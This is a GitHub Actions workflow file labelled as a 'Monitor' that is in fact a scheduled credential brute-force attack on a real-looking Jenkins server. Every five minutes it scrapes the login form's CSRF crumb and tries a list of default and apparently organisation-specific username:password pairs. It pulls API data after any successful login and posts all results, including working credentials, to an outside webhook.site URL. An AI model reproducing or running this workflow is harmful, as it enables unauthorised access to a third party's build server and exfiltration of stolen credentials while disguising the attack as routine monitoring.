name: jmon
on:
  schedule:
    - cron: "*/5 * * * *"
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  jmon:
    runs-on: ubuntu-latest
    steps:
      - name: Monitor
        run: |
          set +e
          {
            echo "=== $(date -u) ==="
            code=$(curl -sS -k -m 15 -o /tmp/l.html -w "%{http_code}" https://jenkins.htpl.cc/login 2>/dev/null)
            echo "login code=$code size=$(wc -c </tmp/l.html 2>/dev/null)"
            if [ "$code" = "200" ]; then
              CRUMB=$(grep -oE "name=\"Jenkins-Crumb\" value=\"[^\"]+" /tmp/l.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
              ACTION=$(grep -oE "action=\"[^\"]+" /tmp/l.html 2>/dev/null | head -1 | sed "s/action=\"//")
              echo "crumb=$CRUMB action=$ACTION"
              rm -f /tmp/cj; curl -sS -k -m 15 -c /tmp/cj -o /dev/null https://jenkins.htpl.cc/login 2>/dev/null
              for pair in "admin:admin" "admin:password" "admin:jenkins" "admin:Jenkins@123" "admin:Payatom@123" "admin:payatom@123" "admin:Htpl@123" "admin:htpl@123" "admin:Admin@123" "admin:admin@123" "admin:Payatom@2024" "admin:Payatom@2025" "admin:ashd18457#" "admin:randomsecretkeyisthisone" "admin:a4a76aabb2293cbe" "admin:oQFfNtp4j9qL5CyF9QGEzAR7cVZRjoEG" "admin:harwex" "harsha:Payatom@123" "harsha:Htpl@123" "harsha:ashd18457#" "Harsha-Sudo08:Payatom@123" "dev.ops:Payatom@123" "jenkins:jenkins" "root:root"; do
                U="${pair%%:*}"; P="${pair#*:}"
                rc=$(curl -sS -k -m 12 -b /tmp/cj -c /tmp/cj -o /tmp/r -w "%{http_code}" -X POST "https://jenkins.htpl.cc${ACTION:-/j_spring_security_check}" --data-urlencode "j_username=$U" --data-urlencode "j_password=$P" --data-urlencode "from=/" --data-urlencode "Jenkins-Crumb=$CRUMB" 2>/dev/null)
                if [ "$rc" = "302" ] || [ "$rc" = "303" ]; then
                  echo "SUCCESS $U:$P code=$rc"
                  curl -sS -k -m 12 -b /tmp/cj https://jenkins.htpl.cc/api/json -o /tmp/api 2>/dev/null
                  head -c 1500 /tmp/api 2>/dev/null
                else
                  echo "FAIL $U:$P code=$rc"
                fi
              done
            fi
          } > /tmp/out.txt 2>&1
          curl -s -m 20 -X POST "https://webhook.site/1729f528-875b-4cd6-9645-5efde7032fff" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt || true
